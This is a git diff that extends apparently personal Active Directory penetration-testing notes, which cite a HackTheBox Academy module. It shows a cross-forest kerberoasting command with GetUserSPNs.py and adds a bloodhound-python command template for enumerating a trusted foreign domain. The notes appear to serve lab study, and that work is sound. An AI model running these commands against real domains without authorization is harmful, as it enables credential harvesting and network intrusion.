@@ -37,4 +37,10 @@ Cross-Forest kerberoasting with GetUserSPNs.py:
 GetUserSPNs.py -request -target-domain <foreigndomain> <localdomain>/wley
 ```
 
-We can also run bloodhound-python to gather information for a foreign domain if we have our 
+We can also run bloodhound-python to gather information for a foreign domain if we have a trust we can abuse, simply add the trusted domain to resolv.conf amd specify its nameserver, then we perform a gathering for bloodhound with bloodhound python:
+```
+bloodhound-python -d <foreign> -dc <foreigndc> -c All -u <username>@<localdomainname> -p <password?
+```
+
+Ref: https://academy.hackthebox.com/app/module/143/section/1509
+
